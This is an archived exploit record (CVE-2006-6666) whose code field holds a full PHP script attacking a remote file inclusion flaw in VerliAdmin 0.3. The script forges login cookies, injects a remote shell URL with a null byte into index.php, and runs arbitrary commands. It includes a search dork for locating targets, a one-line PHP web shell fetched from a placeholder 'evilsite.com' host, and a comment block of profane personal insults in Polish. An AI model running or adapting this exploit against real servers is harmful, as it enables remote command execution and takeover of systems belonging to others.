{
  "id": "2944",
  "title": "VerliAdmin 0.3 - &#039;index.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6666",
  "vuln_type": "unknown",
  "code": "<?\r\n\r\n\r\n\r\n\r\n/*\r\nP.S\r\nChcialem serdecznie niepozdrowic wszystkie kurwy takie jak Ne0 i jego dziwki!!\r\nMam was w dupie, a Ty Ne0 pryszczu jebany pogodz sie z porazka bo to ja zawsze bede lepszy od Ciebie!\r\nNie pozdrawiam tez wszystkie gnidy jakie chowaja sie na swoich smiesznych hubach DC, jestescie poprostu smieszni...\r\nCale to ZOO pozdrawiam srodkowym palcem\r\nH.W.D.Cale Direct Connect PL  \r\nby Kacper & DEVIL TEAM\r\n*/\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n//Kacper Settings \r\n$exploit_name = \"VerliAdmin <= 0.3 File Include Exploit\";\r\n$script_name = \"VerliAdmin 0.3\";\r\n$script_site = \"http://bohyn.czechweb.cz/\";\r\n$dork = 'allinurl:\"verliadmin\"';\r\n//**************************************************************\r\n\r\n\r\nprint '\r\n:::::::::  :::::::::: :::     ::: ::::::::::: :::        \r\n:+:    :+: :+:        :+:     :+:     :+:     :+:        \r\n+:+    +:+ +:+        +:+     +:+     +:+     +:+        \r\n+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        \r\n+#+    +#+ +#+         +#+   +#+      +#+     +#+        \r\n#+#    #+# #+#          #+#+#+#       #+#     #+#        \r\n#########  ##########     ###     ########### ########## \r\n::::::::::: ::::::::::     :::     ::::    ::::  \r\n    :+:     :+:          :+: :+:   +:+:+: :+:+:+ \r\n    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ \r\n    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ \r\n    +#+     +#+        +#+     +#+ +#+       +#+ \r\n    #+#     #+#        #+#     #+# #+#       #+# \r\n    ###     ########## ###     ### ###       ### \r\n\t\r\n   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n \r\n\r\n[Exploit name: '.$exploit_name.'\r\n[Script name: '.$script_name.'\r\n[Script site: '.$script_site.'\r\ndork: '.$dork.'\r\n\r\nFind by: Kacper (a.k.a Rahim)\r\n\r\n\r\n========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========\r\n========>         http://www.rahim.webd.pl/            <========\r\n\r\nContact: kacper1964@yahoo.pl\r\n\r\n(c)od3d by Kacper\r\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\nGreetings DragonHeart and all DEVIL TEAM Patriots :)\r\n- Leito & Leon | friend str0ke ;)\r\n\r\nBlund Coder, D0han, d3m0n, D3m0n (ziom z Niemiec :P), dn0de, DUREK5, fdj, Grzegorz, GrZyB997, konsol, Mandr4ke,\r\nmass, michalind, mIvus, Nua, nukedclx, pepi, QunZ, Qw3rty, RebeL, SkD, Adam, arkadius, asteroid, blue, Ci2u, CrazzyIwan,\r\nDMX, drzewko, ExTrEmE][-][ack, Gelo, Kicaj, Larry, Leito, LEON, Michas, Morpheus, MXZ, Ramzes, redsaq, TomZen\r\n\r\n and\r\n \r\nDr Max Virus\r\nTamTurk,\r\nhackersecurity.org\r\n\r\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n                Greetings for 4ll Fusi0n Group members ;-)\r\n                and all members of hacker.com.pl ;)\r\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n';\r\n\r\nif ($argc<6) {\r\nprint ('\r\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\nUsage: php '.$argv[0].' host shell nick pass cmd OPTIONS\r\nhost:      script server (ip/hostname)\r\nshell:     path to shell\r\nnick:      You username in hub\r\npass:      You username password\r\ncmd:       a shell command (ls -la)\r\nOptions:\r\n -p[port]:    specify a port other than 80\r\n -P[ip:port]: specify a proxy\r\nExample:\r\nphp '.$argv[0].' localhost http://www.evilsite.com/shell.txt Hauru zamek ls -la -P1.1.1.1:80\r\nshell.txt: <?php ob_clean();echo\"Hacker_Kacper_Made_in_Poland!!..Hauru..^_^..the..best..polish..team..Greetz\";ini_set(\"max_execution_time\",0);echo \"hauru\";passthru($_GET[\"cmd\"]);die;?>\r\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n');\r\ndie;\r\n}\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpackets($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo \"\\r\\n\".$html;\r\n}\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$host=$argv[1];\r\n$shell=$argv[2];\r\n$nick=$argv[3];\r\n$password=$argv[4];\r\n$cmd=\"\";\r\n\r\n$port=80;\r\n$proxy=\"\";\r\nfor ($i=5; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\")) {$cmd.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\n\r\nif ($proxy=='') {$p='http://'.$host.':'.$port;}\r\n\r\n$num1 = Rand(97, 122);\r\n$num2 = Rand(65, 90);\r\n$pass = Crypt($password, Chr($num1).Chr($num2));\r\n\r\n$packet =\"GET \".$p.\"index.php?q=\".$shell.\"?cmd=\".$cmd.\"%00 HTTP/1.0\\r\\n\";\r\n$pakiet.=\"Cookie: brwsr_tp=Opera;\\r\\n\";\r\n$pakiet.=\"Cookie: lang=pl;\\r\\n\";\r\n$pakiet.=\"Cookie: login=1;\\r\\n\";\r\n$pakiet.=\"Cookie: nick=\".$nick.\";\\r\\n\";\r\n$pakiet.=\"Cookie: password=\".$pass.\";\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpackets($packet);\r\nif (strstr($html,\"hauru\"))\r\n{\r\n$temp=explode(\"hauru\",$html);\r\ndie($temp[1]);\r\n}\r\necho \"Exploit err0r :(\\n\";\r\necho \"Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\\n\";\r\n?>\r\n\r\n# milw0rm.com [2006-12-18]",
  "url": "https://www.exploit-db.com/exploits/2944"
}